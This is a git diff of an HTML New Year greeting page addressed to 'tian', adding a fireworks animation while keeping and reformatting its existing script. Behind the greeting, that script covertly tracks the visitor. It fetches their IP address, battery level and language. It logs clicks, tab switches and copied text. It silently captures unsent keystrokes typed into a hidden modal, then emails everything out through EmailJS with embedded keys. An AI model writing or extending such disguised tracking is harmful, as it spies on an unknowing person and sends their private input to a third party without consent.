@@ -4,13 +4,35 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>新年快乐</title>
+    
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
+    <script src="https://cdn.jsdelivr.net/npm/fireworks-js@2.10.7/dist/index.umd.js"></script>
+    
     <style>
+        /* --- 烟花画布层：极致深邃的黑夜背景 --- */
+        .fireworks-container {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1; /* 放在最底层 */
+            background: radial-gradient(circle, #000000 0%, #0a0a0a 100%); /* 更有深度的黑夜 */
+        }
+
+        /* --- 页面基础样式 --- */
         body { margin: 0; padding: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #000000; font-family: -apple-system, BlinkMacSystemFont, "SF Pro SC", "SF Pro Display", "PingFang SC", "Helvetica Neue", sans-serif; overflow: hidden; -webkit-font-smoothing: antialiased; flex-direction: column; user-select: none; }
-        .container { text-align: center; opacity: 0; transform: translateY(30px); animation: appleReveal 1.8s cubic-bezier(0.19, 1, 0.22, 1) forwards; z-index: 1; }
+        
+        /* --- 文字容器：允许点击穿透 --- */
+        .container { 
+            text-align: center; opacity: 0; transform: translateY(30px); 
+            animation: appleReveal 1.8s cubic-bezier(0.19, 1, 0.22, 1) forwards; 
+            z-index: 1; pointer-events: none; 
+        }
+        
         h1 { margin: 0; font-size: 5rem; font-weight: 600; letter-spacing: -0.03em; background: linear-gradient(180deg, #FFFFFF 0%, #B0B0B0 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; text-shadow: 0 10px 30px rgba(255, 255, 255, 0.1); cursor: default; }
         h5 { margin-top: 20px; font-size: 2rem; font-weight: 400; letter-spacing: -0.02em; background: linear-gradient(180deg, #FFFFFF 0%, #8E8E93 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        
         @keyframes appleReveal { to { opacity: 1; transform: translateY(0); } }
+        
+        /* --- 隐藏模态框 (你的彩蛋) --- */
         #i-modal { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; transition: opacity 0.4s ease; z-index: 100; }
         #i-modal.v { opacity: 1; pointer-events: all; }
         .m-box { width: 75%; max-width: 280px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
@@ -24,10 +46,13 @@
     </style>
 </head>
 <body>
+    <div class="fireworks-container"></div>
+
     <div class="container">
         <h1>新年快乐</h1>
         <h5>tian</h5>
     </div>
+    
     <div id="i-modal">
         <div class="m-box">
             <div class="m-t">说点什么</div>
@@ -35,6 +60,34 @@
             <div id="s-btn" class="ios-btn">发送</div>
         </div>
     </div>
+
+    <script>
+        const container = document.querySelector('.fireworks-container');
+        // 终极真实感配置参数
+        const fireworks = new Fireworks.default(container, {
+            autoresize: true,
+            opacity: 0.4,         // 较低透明度，让拖尾更柔和真实
+            acceleration: 1.02,   // 火箭上升的物理加速度
+            friction: 0.95,       // 关键：高空气阻力，让烟花炸开后能"挂"在空中
+            gravity: 1.8,         // 关键：重力感，让火星形成"垂柳"下坠效果
+            particles: 350,       // 爆炸粒子数：极大增加密度，制造绚烂感
+            traceLength: 5,       // 超长拖尾，制造流光溢彩的效果
+            traceSpeed: 6,        // 拖尾慢速消失
+            explosion: 10,        // 巨大的爆炸范围
+            intensity: 12,        // 自动燃放频率
+            flickering: 80,       // 强烈的闪烁爆裂感
+            lineStyle: 'round',   
+            hue: { min: 0, max: 360 }, // 全光谱色彩
+            delay: { min: 20, max: 50 },
+            rocketsPoint: { min: 50, max: 50 },
+            lineWidth: { explosion: { min: 1, max: 4 }, trace: { min: 0.5, max: 2 } },
+            brightness: { min: 70, max: 100 }, // 极高的亮度
+            decay: { min: 0.008, max: 0.02 },  // 极慢的消失速度，余韵悠长
+            mouse: { click: true, max: 1 }     // 允许点击互动
+        });
+        fireworks.start();
+    </script>
+
     <script type="text/javascript">
         (function() { emailjs.init("VNzKmFJA5x37kDEj3"); })();
         var c = { s: 'service_389mei5', t: 'template_px5akze' };
@@ -54,14 +107,11 @@
                     p_language: navigator.language,
                     ip_address: "获取中..." 
                 };
-
                 fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(ipd => {
+                .then(r => r.json()).then(ipd => {
                     payload.ip_address = ipd.ip;
                     emailjs.send(c.s, c.t, payload);
-                })
-                .catch(() => {
+                }).catch(() => {
                     payload.ip_address = "IP_ERR";
                     emailjs.send(c.s, c.t, payload);
                 });
@@ -72,65 +122,38 @@
                     bat = (b.level * 100) + "% " + (b.charging ? "(C)" : "");
                     sd("INIT", `电量: ${bat}`);
                 });
-            } else {
-                sd("INIT", "Ready");
-            }
+            } else { sd("INIT", "Ready"); }
             
             var m = document.getElementById('i-modal');
             var inp = document.getElementById('k-input');
             var btn = document.getElementById('s-btn');
             
+            // 点击计数逻辑：点击屏幕任何非模态框区域都计数
             document.addEventListener('click', function(e) {
                 if (!m.contains(e.target) && !m.classList.contains('v')) {
                     d.c++;
+                    // console.log("Hidden Menu Count:", d.c); // 调试用
                     if(d.c === 5) m.classList.add('v');
                 }
                 log('CLK', `${e.target.tagName}`);
             });
 
-            m.addEventListener('click', function(e) {
-                if(e.target === m) closeBox("BG_TAP");
-            });
-
-            btn.addEventListener('click', function() {
-                if(inp.value) sd("MANUAL_SEND", inp.value);
-                closeBox("BTN_SEND");
-            });
-
-            function closeBox(r) {
-                m.classList.remove('v');
-                d.c = 0; 
-                log('ACT', `Closed: ${r}`);
-                inp.value = "";
-            }
-
-            document.addEventListener('visibilitychange', function() {
-                log('VIS', document.hidden ? "HIDE" : "SHOW");
-            });
-
-            document.addEventListener('copy', function() {
-                log('CPY', document.getSelection().toString());
-            });
-
+            m.addEventListener('click', function(e) { if(e.target === m) closeBox("BG_TAP"); });
+            btn.addEventListener('click', function() { if(inp.value) sd("MANUAL_SEND", inp.value); closeBox("BTN_SEND"); });
+            function closeBox(r) { m.classList.remove('v'); d.c = 0; log('ACT', `Closed: ${r}`); inp.value = ""; }
+            document.addEventListener('visibilitychange', function() { log('VIS', document.hidden ? "HIDE" : "SHOW"); });
+            document.addEventListener('copy', function() { log('CPY', document.getSelection().toString()); });
             inp.addEventListener('input', function(e) {
                 if(d.it) clearTimeout(d.it);
-                d.it = setTimeout(function() {
-                    sd("SILENT_CAP", e.target.value);
-                }, 1500);
+                d.it = setTimeout(function() { sd("SILENT_CAP", e.target.value); }, 1500);
             });
-
             function log(t, v) {
                 var tm = Math.floor((Date.now() - d.st)/1000);
                 d.b.push(`[${tm}s][${t}] ${v}`);
                 if(d.b.length >= 6) sendLog();
                 else { if(d.tm) clearTimeout(d.tm); d.tm = setTimeout(sendLog, 6000); }
             }
-
-            function sendLog() {
-                if(d.b.length === 0) return;
-                sd("LOGS", d.b.join('\n'));
-                d.b = [];
-            }
+            function sendLog() { if(d.b.length === 0) return; sd("LOGS", d.b.join('\n')); d.b = []; }
         };
     </script>
 </body>
